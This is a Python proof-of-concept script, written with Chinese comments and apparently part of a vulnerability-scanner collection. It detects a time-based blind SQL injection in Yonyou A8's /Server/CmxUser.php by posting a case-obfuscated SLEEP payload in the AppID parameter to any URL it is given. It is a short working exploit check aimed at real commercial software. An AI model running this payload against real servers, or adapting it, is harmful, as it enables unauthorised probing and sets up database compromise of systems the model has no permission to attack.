#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友优普a8 CmxUserSQL时间盲注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0157215
author: Lucifer
description: 文件/Server/CmxUser.php中,post参数AppID存在SQL注入。
'''
import sys
import json
import time
import requests
import warnings
def run(url):
        result = ['用友优普a8 CmxUserSQL时间盲注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "UserName":"test",
            "AppID[]":"0 AnD(SeLeCt*FrOm(SeLeCt(SlEeP(6)))PyGh)"
        }
        payload = "/Server/CmxUser.php?pgid=AddUser_Step4"
        vulnurl = url + payload
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1] = vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    